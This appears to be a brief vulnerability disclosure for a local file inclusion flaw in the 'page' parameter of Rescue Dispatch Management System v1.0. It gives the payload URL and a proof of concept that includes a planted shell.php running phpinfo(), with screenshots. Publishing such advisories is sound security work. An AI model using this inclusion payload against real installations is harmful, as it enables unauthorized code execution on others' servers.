# Rescue Dispatch Management System v1.0 by oretnom23 has The local file contains

vendor:  https://www.sourcecodester.com/php/15296/rescue-dispatch-management-system-phpoop-free-source-code.html

Vulnerability File: ip/rdms/admin/?page=

Vulnerability location: ip/rdms/admin/?page=, page

Payload: ip/rdms/admin/?page=shell

![image](https://user-images.githubusercontent.com/54017627/170479524-eb6df0d6-92e9-420c-9330-f05be64b5895.png)

We create a shell.php under the PHP file of the root of the website, which reads "<? phpinfo ();? > "

![image](https://user-images.githubusercontent.com/54017627/170479151-b4aabc1a-fdbd-45d2-8f5a-248d37092584.png)

And visit http://rdms/admin/?page=shell You can see that phpinfo has been successfully included

![image](https://user-images.githubusercontent.com/54017627/170479257-5483aa85-534c-4360-8977-fbf63f20b64a.png)
